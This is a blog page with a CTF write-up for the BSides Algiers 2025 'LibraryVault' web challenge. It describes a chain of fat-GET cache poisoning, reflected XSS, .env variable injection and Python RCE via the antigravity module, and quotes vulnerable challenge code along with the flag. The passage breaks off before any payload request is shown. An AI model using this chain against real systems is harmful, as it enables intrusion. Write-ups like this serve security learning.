<!DOCTYPE html>
<html lang="en">
    <head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Bsides_algiers_2k25_web_library_of_vaults - My Personal Blog</title><meta name="Description" content="This is my personal blog"><meta property="og:url" content="http://localhost:1313/blog/posts/bsides_algiers_2k25_web_library_of_vaults/">
  <meta property="og:site_name" content="My Personal Blog">
  <meta property="og:title" content="Bsides_algiers_2k25_web_library_of_vaults">
  <meta property="og:description" content="LibraryVault CTF Challenge Writeup Challenge: LibraryVault
Event: BSides Algiers 2025
Category: Web
Difficulty: Hard
I solved this challenge during BSides Algiers 2025, and I was the only player to solve it the intended way. It was a web challenge that required chaining multiple vulnerabilities to achieve RCE.
On a side note, my team took first place in the CTF TL;DR This challenge chains four vulnerabilities to achieve RCE:">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-12-21T14:35:26+01:00">
    <meta property="article:modified_time" content="2025-12-21T14:35:26+01:00">
    <meta property="article:tag" content="Web Security">
    <meta property="article:tag" content="Ctf">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Bsides_algiers_2k25_web_library_of_vaults">
  <meta name="twitter:description" content="LibraryVault CTF Challenge Writeup Challenge: LibraryVault
Event: BSides Algiers 2025
Category: Web
Difficulty: Hard
I solved this challenge during BSides Algiers 2025, and I was the only player to solve it the intended way. It was a web challenge that required chaining multiple vulnerabilities to achieve RCE.
On a side note, my team took first place in the CTF TL;DR This challenge chains four vulnerabilities to achieve RCE:">
<meta name="application-name" content="My Personal Blog">
<meta name="apple-mobile-web-app-title" content="My Personal Blog">
<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/blog/posts/bsides_algiers_2k25_web_library_of_vaults/" /><link rel="prev" href="http://localhost:1313/blog/posts/htb_tombwatcher/" /><link rel="stylesheet" href="/blog/css/style.min.css"><link rel="preload" href="/blog/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/blog/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/blog/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/blog/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Bsides_algiers_2k25_web_library_of_vaults",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/blog\/posts\/bsides_algiers_2k25_web_library_of_vaults\/"
        },"genre": "posts","keywords": "ctf, web security, ctf","wordcount":  2935 ,
        "url": "http:\/\/localhost:1313\/blog\/posts\/bsides_algiers_2k25_web_library_of_vaults\/","datePublished": "2025-12-21T14:35:26+01:00","dateModified": "2025-12-21T14:35:26+01:00","license": "2025 F0DH1L","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "F0DH1L"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
          const query = window.matchMedia('(prefers-color-scheme: dark)');
          function applyTheme() {
            let theme = window.localStorage?.getItem('theme') || 'dark';
            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
            document.body.setAttribute('theme', isDark? 'dark' : 'light');
            document.body.setAttribute('cfg-theme', theme);
          }

          applyTheme();
          query.addEventListener('change', applyTheme);
        </script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/blog/" title="My Personal Blog">F0DH1L Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/blog/posts/"> Posts </a><a class="menu-item" href="/blog/tags/"> Tags </a><a class="menu-item" href="/blog/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/blog/" title="My Personal Blog">F0DH1L Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/blog/posts/" title="">Posts</a><a class="menu-item" href="/blog/tags/" title="">Tags</a><a class="menu-item" href="/blog/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Bsides_algiers_2k25_web_library_of_vaults</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/blog/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>F0DH1L</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-21">2025-12-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2935 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;14 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#tldr">TL;DR</a></li>
    <li><a href="#overview">Overview</a></li>
    <li><a href="#application-architecture">Application Architecture</a>
      <ul>
        <li><a href="#cdn-service-port-1337">CDN Service (Port 1337)</a></li>
        <li><a href="#web-application-port-8888">Web Application (Port 8888)</a></li>
        <li><a href="#admin-bot">Admin Bot</a></li>
      </ul>
    </li>
    <li><a href="#application-flow">Application Flow</a>
      <ul>
        <li><a href="#normal-user-flow">Normal User Flow</a></li>
        <li><a href="#admin-panel-flow">Admin Panel Flow</a></li>
      </ul>
    </li>
    <li><a href="#the-path-to-the-flag">The Path to the Flag</a>
      <ul>
        <li><a href="#finding-the-entry-point">Finding the Entry Point</a></li>
        <li><a href="#discovery-1-the-cache-poisoning">Discovery #1: The Cache Poisoning</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#discovery-2-xss-in-the-mix">Discovery #2: XSS in the Mix</a></li>
        <li><a href="#discovery-3-the-python-antigravity">Discovery #3: The Python Antigravity</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#discovery-4-how-we-can-overwrite-the-env-file">Discovery #4: How We Can Overwrite the .env File</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li>
      <ul>
        <li></li>
      </ul>
    </li>
    <li><a href="#putting-it-all-together">Putting It All Together</a>
      <ul>
        <li><a href="#the-complete-xss-payload">The Complete XSS Payload</a></li>
      </ul>
    </li>
    <li><a href="#flag-shellmatesc4ch3d_"><strong>FLAG: shellmates{c4ch3d_x55_dr1nk5cr5f&amp;_p01s0n3d_d0t3nv}</strong></a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="libraryvault-ctf-challenge-writeup">LibraryVault CTF Challenge Writeup</h1>
<p><strong>Challenge:</strong> LibraryVault<br>
<strong>Event:</strong> BSides Algiers 2025<br>
<strong>Category:</strong> Web<br>
<strong>Difficulty:</strong> Hard</p>
<p>I solved this challenge during BSides Algiers 2025, and I was the only player to solve it the intended way. It was a web challenge that required chaining multiple vulnerabilities to achieve RCE.</p>
<h1 id="on-a-side-note-my-team-took-first-place-in-the-ctf"><strong>On a side note, my team took first place in the CTF</strong></h1>
<p><img
        class="lazyload"
        src="/blog/svg/loading.min.svg"
        data-src="/blog/images/bsides_algiers_2k25_web_library_of_vaults/image.png"
        data-srcset="/blog/images/bsides_algiers_2k25_web_library_of_vaults/image.png, /blog/images/bsides_algiers_2k25_web_library_of_vaults/image.png 1.5x, /blog/images/bsides_algiers_2k25_web_library_of_vaults/image.png 2x"
        data-sizes="auto"
        alt="/blog/images/bsides_algiers_2k25_web_library_of_vaults/image.png"
        title="scoreboard" /></p>
<hr>
<h2 id="tldr">TL;DR</h2>
<p>This challenge chains four vulnerabilities to achieve RCE:</p>
<ol>
<li><strong>Cache Poisoning</strong> - GET request with body (Fat GET) bypasses cache key validation</li>
<li><strong>XSS</strong> - Disabled template autoescaping allows JavaScript injection</li>
<li><strong>Environment Variable Injection</strong> - <code>.env</code> file parsing bypass through single quote escaping to inject arbitrary <code>BROWSER</code> and <code>PYTHONWARNINGS</code> environment variables</li>
<li><strong>Python RCE</strong> - <code>PYTHONWARNINGS</code> + <code>BROWSER</code> env vars trigger command execution via <code>antigravity</code> module</li>
</ol>
<hr>
<p>Now lock your seatbelts and let&rsquo;s lock in</p>
<hr>
<p><img
        class="lazyload"
        src="/blog/svg/loading.min.svg"
        data-src="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/roronoa-zoro.gif"
        data-srcset="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/roronoa-zoro.gif, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/roronoa-zoro.gif 1.5x, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/roronoa-zoro.gif 2x"
        data-sizes="auto"
        alt="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/roronoa-zoro.gif"
        title="zoro gif" /></p>
<hr>
<h2 id="overview">Overview</h2>
<p><strong>LibraryVault</strong> is a web application that consists of three main components:</p>
<ol>
<li><strong>CDN Service</strong> (Go, port 1337) - Acts as a caching layer with Redis</li>
<li><strong>Web Application</strong> (Python Tornado, port 8888) - Main application with book search and admin panel</li>
<li><strong>Admin Bot</strong> (Selenium) - Simulates an admin user visiting reported URLs</li>
</ol>
<hr>
<h2 id="application-architecture">Application Architecture</h2>
<h3 id="cdn-service-port-1337">CDN Service (Port 1337)</h3>
<ul>
<li>Acts as a reverse proxy and caching layer. It forwards the requests that are eligible for caching to the backend (localhost:8888). It uses Redis to cache responses for 60 seconds. The cache key is based on SHA256 hash of the URL.</li>
</ul>
<p>It uses this function to distinguish the dynamic routes from the static routes</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-go">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">dynamic</span><span class="p">(</span><span class="nx">req</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Method</span> <span class="o">!=</span> <span class="nx">http</span><span class="p">.</span><span class="nx">MethodGet</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Non-cacheable endpoints</span>
</span></span><span class="line"><span class="cl">	<span class="nx">dynamicPaths</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="s">&#34;/panel&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">path</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">dynamicPaths</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">HasPrefix</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nx">Path</span><span class="p">,</span> <span class="nx">path</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>So all POST requests are not cached and requests to <code>/panel</code> are not cached.</p>
<p>Reverse proxies sometimes add or remove headers, but this one doesn&rsquo;t do any of that - it forwards everything as is</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-go">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl">	<span class="nx">req</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">http</span><span class="p">.</span><span class="nf">NewRequest</span><span class="p">(</span><span class="nx">origReq</span><span class="p">.</span><span class="nx">Method</span><span class="p">,</span> <span class="nx">originURL</span><span class="p">.</span><span class="nf">String</span><span class="p">(),</span> <span class="nx">origReq</span><span class="p">.</span><span class="nx">Body</span><span class="p">)</span></span></span></code></pre></div></div>
<h3 id="web-application-port-8888">Web Application (Port 8888)</h3>
<ul>
<li>Built with Python Tornado framework. It has these key endpoints:
<ul>
<li><code>/search</code> - Search for books by title/author</li>
<li><code>/api/prev_searches</code> - Returns previous search queries</li>
<li><code>/panel</code> - Admin-only panel for backup configuration</li>
<li><code>/api/report</code> - Triggers admin bot to visit a URL</li>
</ul>
</li>
</ul>
<p>The first finding in this challenge is that there is an XSS vulnerability on <code>/search</code> in the query parameter. It is reflected directly and not escaped. You can verify this in the code where template autoescaping is <strong>disabled</strong> (<code>autoescape=None</code>)</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">make_app</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">tornado</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">Application</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/()&#34;</span><span class="p">,</span> <span class="n">tornado</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">StaticFileHandler</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;static&#34;</span><span class="p">,</span> <span class="s2">&#34;default_filename&#34;</span><span class="p">:</span> <span class="s2">&#34;index.html&#34;</span><span class="p">}),</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/books&#34;</span><span class="p">,</span> <span class="n">BooksHandler</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/login&#34;</span><span class="p">,</span> <span class="n">LoginHandler</span><span class="p">),</span>  
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/register&#34;</span><span class="p">,</span> <span class="n">RegisterHandler</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/logout&#34;</span><span class="p">,</span> <span class="n">LogoutHandler</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/search&#34;</span><span class="p">,</span> <span class="n">SearchHandler</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/api/prev_searches&#34;</span><span class="p">,</span> <span class="n">ApiPrevSearchesHandler</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/api/report&#34;</span><span class="p">,</span> <span class="n">ReportHandler</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/api/books&#34;</span><span class="p">,</span> <span class="n">ApiBooksHandler</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/panel&#34;</span><span class="p">,</span> <span class="n">PanelHandler</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/static/(.*)&#34;</span><span class="p">,</span> <span class="n">tornado</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">StaticFileHandler</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;static&#34;</span><span class="p">}),</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;^(?!/static/).*&#34;</span><span class="p">,</span> <span class="n">NotFoundHandler</span><span class="p">),</span>  
</span></span><span class="line"><span class="cl">    <span class="p">],</span> <span class="n">cookie_secret</span><span class="o">=</span><span class="n">urandom</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span> <span class="n">autoescape</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">template_path</span><span class="o">=</span><span class="s2">&#34;templates&#34;</span><span class="p">,</span> <span class="n">login_url</span><span class="o">=</span><span class="s2">&#34;/login&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
<h3 id="admin-bot">Admin Bot</h3>
<ul>
<li>Uses Selenium with Chrome in headless mode. It first logs in as admin with credentials from <code>config.py</code>. The twist here is that the bot doesn&rsquo;t visit the URL you send - it just visits a fixed URL: <code>http://127.0.0.1:1337/search?query=I%20BELEIVE%20IT%20DOESNT%20WORK</code>. The <code>/api/report</code> endpoint doesn&rsquo;t accept user input - it always triggers the bot to visit the same predetermined search URL</li>
</ul>
<hr>
<h2 id="application-flow">Application Flow</h2>
<h3 id="normal-user-flow">Normal User Flow</h3>
<ol>
<li>User visits the application through CDN (port 1337)</li>
<li>CDN checks Redis cache for the requested URL</li>
<li>On cache miss, CDN forwards request to backend (port 8888)</li>
<li>Backend processes request and returns response</li>
<li>CDN caches the response and serves it to the user</li>
<li>Users can trigger <code>/api/report</code> which makes the admin bot visit the fixed URL: <code>/search?query=I%20BELEIVE%20IT%20DOESNT%20WORK</code></li>
<li>On cache hit, the response is directly fetched from Redis DB and given to the user</li>
</ol>
<h3 id="admin-panel-flow">Admin Panel Flow</h3>
<ol>
<li>Admin authenticates and accesses <code>/panel</code>. They can configure backup settings: <code>BACKUP_SERVER</code> and <code>ARCHIVE_PATH</code>. These settings are stored in <code>.env</code> file using <code>python-dotenv</code>.</li>
<li>They can also trigger backup via &ldquo;Run Backup&rdquo; which:
<ul>
<li>Loads environment variables from <code>.env</code></li>
<li>Executes <code>/app/utils/backup_catalog.py</code> via subprocess</li>
<li>Passes environment variables to the Python subprocess</li>
</ul>
</li>
</ol>
<p>The problem is that the backup script doesn&rsquo;t do anything:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">backup</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">backup_server</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;BACKUP_SERVER&#34;</span><span class="p">,</span> <span class="s2">&#34;localhost&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">archive_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;ARCHIVE_PATH&#34;</span><span class="p">,</span> <span class="s2">&#34;/tmp/backup&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Starting catalog backup process...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Configuration: SERVER=</span><span class="si">{</span><span class="n">backup_server</span><span class="si">}</span><span class="s2">, PATH=</span><span class="si">{</span><span class="n">archive_path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># Simulate backup process</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Connecting to backup server...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Connection established.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Compressing catalog data to </span><span class="si">{</span><span class="n">archive_path</span><span class="si">}</span><span class="s2">...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Uploading archive...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Backup completed successfully.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">backup</span><span class="p">()</span></span></span></code></pre></div></div>
<hr>
<h2 id="the-path-to-the-flag">The Path to the Flag</h2>
<h3 id="finding-the-entry-point">Finding the Entry Point</h3>
<p>When I first fired up the challenge, I was greeted with a simple book search application. Nothing too fancy - just a search bar and some results. But as always, I started poking around the source code to understand what I was dealing with.</p>
<p>The architecture was interesting: a Go-based CDN service sitting in front of a Python Tornado backend. The CDN caught my attention immediately because caching layers are often goldmines for subtle vulnerabilities.</p>
<h3 id="discovery-1-the-cache-poisoning">Discovery #1: The Cache Poisoning</h3>
<p>Diving into <code>cdn-service/main.go</code>, I noticed something peculiar. The CDN was computing cache keys using only the URL:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-go">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="nx">key</span> <span class="o">:=</span> <span class="nf">hash</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">String</span><span class="p">())</span></span></span></code></pre></div></div>
<p>But when forwarding requests to the backend, it was sending <em>everything</em> - including the request body:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-go">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="nx">req</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">http</span><span class="p">.</span><span class="nf">NewRequest</span><span class="p">(</span><span class="nx">origReq</span><span class="p">.</span><span class="nx">Method</span><span class="p">,</span> <span class="nx">originURL</span><span class="p">.</span><span class="nf">String</span><span class="p">(),</span> <span class="nx">origReq</span><span class="p">.</span><span class="nx">Body</span><span class="p">)</span></span></span></code></pre></div></div>
<hr>
<h1 id="wait-a-minute--get-requests-with-bodies"><strong>Wait a minute !!!! GET requests with bodies?</strong></h1>
<hr>
<p><img
        class="lazyload"
        src="/blog/svg/loading.min.svg"
        data-src="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/luffy-zoro.gif"
        data-srcset="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/luffy-zoro.gif, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/luffy-zoro.gif 1.5x, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/luffy-zoro.gif 2x"
        data-sizes="auto"
        alt="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/luffy-zoro.gif"
        title="luffy zoro" /></p>
<hr>
<h1 id="wait-get-requests-with-bodies"><strong>Wait, GET requests with bodies?</strong></h1>
<p>I know something called Fat GET where you can send a request body in a GET request.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>What is a Fat GET: If an application allows &#34;fat GET&#34; requests, which include a body in the request, 
and the request body is unkeyed and included in the response, it can create an opportunity for cache poisoning. </code></pre></div>
<p>After investigating Tornado&rsquo;s documentation, I discovered something crucial about how it handles request arguments. According to the <a href="https://www.tornadoweb.org/en/stable/web.html#tornado.web.RequestHandler.get_argument" target="_blank" rel="noopener noreffer ">Tornado documentation</a>, the <code>get_argument()</code> method has two important behaviors:</p>
<hr>
<p><img
        class="lazyload"
        src="/blog/svg/loading.min.svg"
        data-src="/blog/images/bsides_algiers_2k25_web_library_of_vaults/image-3.png"
        data-srcset="/blog/images/bsides_algiers_2k25_web_library_of_vaults/image-3.png, /blog/images/bsides_algiers_2k25_web_library_of_vaults/image-3.png 1.5x, /blog/images/bsides_algiers_2k25_web_library_of_vaults/image-3.png 2x"
        data-sizes="auto"
        alt="/blog/images/bsides_algiers_2k25_web_library_of_vaults/image-3.png"
        title="Tornado documentation showing get_argument() method searches both query and body arguments" /></p>
<hr>
<ol>
<li><strong>&ldquo;This method searches both the query and body arguments&rdquo;</strong> - Tornado processes parameters from both the URL query string AND the request body</li>
<li><strong>&ldquo;If the argument appears in the request more than once, we return the last value&rdquo;</strong> - When the same parameter exists in both locations, the body value takes precedence</li>
</ol>
<p>This means an attacker can send a GET request with a parameter in the URL (which becomes the cache key) and a malicious parameter with the same name in the body (which gets processed by Tornado). Since the cache key only considers the URL, the poisoned response gets cached under that URL, and anyone visiting that URL later receives the malicious cached response.</p>
<p>I tested it out - sent a GET request to <code>/search</code> with a query parameter in the URL and a different value in the body. Sure enough, Tornado processed the body parameter and it worked! So the plan is to:</p>
<ol>
<li>Send a GET request with that static URL (which becomes the cache key)</li>
<li>Include the malicious payload in the body</li>
<li>The CDN will cache the malicious response under that static URL entry in Redis cache</li>
<li>Anyone visiting that URL later would get my poisoned response</li>
</ol>
<p>We can verify this with the following request:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
